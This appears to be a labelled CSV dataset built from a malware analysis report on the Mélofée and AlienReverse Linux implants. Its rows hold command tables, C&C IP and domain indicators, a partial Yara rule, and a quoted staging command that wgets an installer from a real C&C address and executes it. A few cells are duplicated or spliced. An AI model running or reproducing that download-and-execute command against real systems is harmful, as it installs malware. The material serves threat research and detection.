report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Melofee-exatrack.csv,0xa003001,write,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"Also implements the management of a Socks proxy 0x110073	CmdOnKbdRecord	Unimplemented 0x110075	CmdOnWorkTime	Writes the expected runtime hours in the file /tmp/worktime The packet format used by the communication protocol is very similar to the one used by Mélofée: struct AlienComzPacket {     unsigned int dwTickCount;     unsigned int dwMagic1; // 0xa003001     unsigned int dwMagic2; // 0x10000137, also used to indicate if the packet has data     unsigned int dwCommandID;     unsigned int dwTotalSize;     unsigned int dwEncryptedSize;     unsigned int ;     char []      data; // The data encrypted using pel_encrypt } While we initially thought that this sample was related to the Mélofée family, we came to the conclusion that it is a distinct tool"
Melofee-exatrack.csv,0x110061,support/change,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",1,1,brk(),"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,0xe0e0e0e,send,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The kernel rootkit expects the userland component to send a value of 0xe0e0e0e during the IOCTL call, with 2 commands supported (these two commands being hide and show)"
Melofee-exatrack.csv,0x60001,use/ummap,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",1,1,munmap(),"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,(0x43),,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The developper was also kind enough to includes an usage function describing the installer’s options: void usage(undefined8 param_1) {   printf(Usage: <%s> [options]\n,param_1);   puts(    -r                  Remove);   puts(    -i <data file>      Install);   puts(    -d                  Run in background);   puts(    -h                  Show help);   return; } Configuration management The configuration is encrypted using the RC4 algorithm in the two early samples, and with a simple xor with a single byte key (0x43) in the undated sample"
Melofee-exatrack.csv,0x429b7a,hide,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"Some of the underlying code is also present in the two earlier samples (as documented by leftover RTTI information), and three types of server were available: TCPServer (type 0x00) TLServer (type 0x1) UDPServer (type 0x2) One interesting tidbit of this code is hidden in the receive function of the TLSServer (at address 0x429b7a in the undated sample)"
Melofee-exatrack.csv,0x110066,cmdonportmappe,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,0x4,create,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,--reverse-address=192.168.1.101:80,,NET,ip_addr/ip_addr:port/port,0,0,,$str_alien_14 = Example: ./AlienReverse --reverse-address=192.168.1.101:80 --reverse-password=123456         $str_alien_15 = Not during working hours!
Melofee-exatrack.csv,173.209.62.186,issue,NET,ip_addr/ip_addr:port/port,0,0,,Probable links with Winnti The response issued by the C&C server at the IP address 173.209.62.186 on the port 443 could be uniquely linked to another domain dev.yuanta.dev
Melofee-exatrack.csv,156.67.208.192,domain,NET,ip_addr/ip_addr:port/port,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
Melofee-exatrack.csv,http://173.209.62.186:8765/installer,wget,NET,ip_addr/ip_addr:port/port,1,1,send(),"wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument"
Melofee-exatrack.csv,http://173.209.62.186:8765/installer,wget,NET,ip_addr/ip_addr:port/port,1,1,send(),"wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument"
Melofee-exatrack.csv,147.139.28.254,stage,NET,ip_addr/ip_addr:port/port,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
